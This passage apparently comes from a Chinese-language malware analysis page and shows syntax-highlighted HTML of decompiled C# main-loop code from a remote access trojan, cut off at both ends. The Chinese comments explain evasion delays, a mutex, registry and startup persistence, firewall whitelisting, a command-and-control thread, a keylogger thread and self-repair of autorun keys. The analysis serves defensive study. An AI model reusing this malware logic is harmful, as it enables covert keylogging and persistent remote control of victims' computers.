style="--0:#4D9375;--1:#1E754F">catch</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#5DA994;--1:#2E8F82">Exception</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">ex</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#758575DD;--1:#A0ADA0">// 静默捕获，不暴露启动参数处理失败</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#BD976A;--1:#B07D48">Thread</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Sleep</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#4C9A91;--1:#2F798A">5000</span><span style="--0:#666666;--1:#999999">);</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 延迟5秒：规避安全软件对“命令行启动后快速执行”的检测</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 第二步：单实例运行（防多开暴露） ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">bool</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">isFirstInstance</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">false</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#758575DD;--1:#A0ADA0">// 创建互斥体（Mutex）：以OK.RG为唯一标识，确保仅一个恶意进程运行</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">MT</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#5DA994;--1:#2E8F82">Mutex</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#4D9375;--1:#1E754F">true</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">RG</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">ref</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">isFirstInstance</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#CB7676;--1:#AB5959">!</span><span style="--0:#BD976A;--1:#B07D48">isFirstInstance</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 已有实例运行→直接退出，避免多进程暴露</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#BD976A;--1:#B07D48">ProjectData</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">EndApp</span><span style="--0:#666666;--1:#999999">();</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 第三步：启动持久化+自保护模块（INS） ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">INS</span><span style="--0:#666666;--1:#999999">();</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 调用之前分析的INS函数：完成文件自复制、防火墙白名单、注册表/启动文件夹自启</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 第四步：初始化恶意程序路径参数 ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#CB7676;--1:#AB5959">!</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Idr</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">EXE</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">LO</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Name</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34">    </span><span style="--0:#758575DD;--1:#A0ADA0">// 重置恶意程序文件名</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">DR</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">LO</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Directory</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Name</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 重置恶意程序所在目录</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 第五步：启动C2通信线程（RC） ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#758575DD;--1:#A0ADA0">// 新建线程启动RC函数（C2通信循环），栈大小1MB：降低资源占用，避免主线程阻塞</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#5DA994;--1:#2E8F82">Thread</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">thread</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#5DA994;--1:#2E8F82">Thread</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#5DA994;--1:#2E8F82">ThreadStart</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">RC</span><span style="--0:#666666;--1:#999999">),</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#BD976A;--1:#B07D48">thread</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Start</span><span style="--0:#666666;--1:#999999">();</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 第六步：启动键盘记录线程（WRK） ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">kq</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#5DA994;--1:#2E8F82">kl</span><span style="--0:#666666;--1:#999999">();</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 实例化键盘记录类（kl）</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#BD976A;--1:#B07D48">thread</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#5DA994;--1:#2E8F82">Thread</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#5DA994;--1:#2E8F82">ThreadStart</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">kq</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">WRK</span><span style="--0:#666666;--1:#999999">),</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">);</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 启动WRK键盘记录函数</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#BD976A;--1:#B07D48">thread</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Start</span><span style="--0:#666666;--1:#999999">();</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">catch</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#5DA994;--1:#2E8F82">Exception</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">ex2</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#758575DD;--1:#A0ADA0">// 键盘记录启动失败不影响主流程：静默捕获，保证C2通信等核心功能运行</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 第七步：系统事件监听（关机/注销收尾） ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">int</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">num</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">string</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">lastActState</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">""</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">BD</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// OK.BD为true时，监听系统会话结束事件</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#758575DD;--1:#A0ADA0">// 注册SessionEnding事件（用户注销/系统关机）：触发时调用OK.ED()收尾（清理痕迹）</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#BD976A;--1:#B07D48">SystemEvents</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">SessionEnding</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">delegate</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#4D9375;--1:#1E754F">object</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">a0</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#5DA994;--1:#2E8F82">SessionEndingEventArgs</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">a1</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ED</span><span style="--0:#666666;--1:#999999">();</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">};</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">pr</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">);</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 调整进程优先级（1=低优先级）：降低CPU占用，规避检测</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#4D9375;--1:#1E754F">catch</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#5DA994;--1:#2E8F82">Exception</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">ex3</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#758575DD;--1:#A0ADA0">// ========== 第八步：核心守护循环（无限运行，维护恶意状态） ==========</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">checked</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#4D9375;--1:#1E754F">for</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(;;)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 无限循环：持续守护，直到进程被终止</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#BD976A;--1:#B07D48">Thread</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Sleep</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#4C9A91;--1:#2F798A">1000</span><span style="--0:#666666;--1:#999999">);</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 1秒延迟：极低CPU占用，用户/安全软件无感知</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#CB7676;--1:#AB5959">!</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Cn</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">lastActState</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">""</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// C2断开时重置状态标记</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#BD976A;--1:#B07D48">Application</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">DoEvents</span><span style="--0:#666666;--1:#999999">();</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 处理消息循环，避免程序假死</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#BD976A;--1:#B07D48">num</span><span style="--0:#CB7676;--1:#AB5959">++</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#758575DD;--1:#A0ADA0">// 每5次循环：调整进程最小工作集，降低内存占用</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">num</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">5</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#758575DD;--1:#A0ADA0">// 限制进程最小工作集为1024字节：减少内存占用，规避“高内存可疑进程”检测</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#BD976A;--1:#B07D48">Process</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">GetCurrentProcess</span><span style="--0:#666666;--1:#999999">().</span><span style="--0:#BD976A;--1:#B07D48">MinWorkingSet</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#5DA994;--1:#2E8F82">IntPtr</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#4C9A91;--1:#2F798A">1024</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#4D9375;--1:#1E754F">catch</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#5DA994;--1:#2E8F82">Exception</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">ex4</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#758575DD;--1:#A0ADA0">// 每8次循环：检测系统激活状态，变化则上报C2</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">num</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">>=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">8</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#BD976A;--1:#B07D48">num</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#4D9375;--1:#1E754F">string</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">currentActState</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ACT</span><span style="--0:#666666;--1:#999999">();</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 获取系统激活状态/恶意程序运行状态</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">Operators</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">CompareString</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">lastActState</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">currentActState</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">false</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">!=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#BD976A;--1:#B07D48">lastActState</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">currentActState</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Send</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">act</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Y</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">currentActState</span><span style="--0:#666666;--1:#999999">);</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#758575DD;--1:#A0ADA0">// 向C2上报状态变化</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#758575DD;--1:#A0ADA0">// 自修复：检查注册表自启项，被修改则重新写入（保证持久化不失效）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Isu</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#758575DD;--1:#A0ADA0">// 检查HKCU自启项：被删除/修改则重新写入</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">Operators</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ConditionalCompareObjectNotEqual</span><span style="--0:#666666;--1:#999999">(</span></div></div><div class="ec-line"><div class="code"><span class="indent">                            </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">F</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Registry</span><span style="--0:#666666;--1:#999999">.</span><span 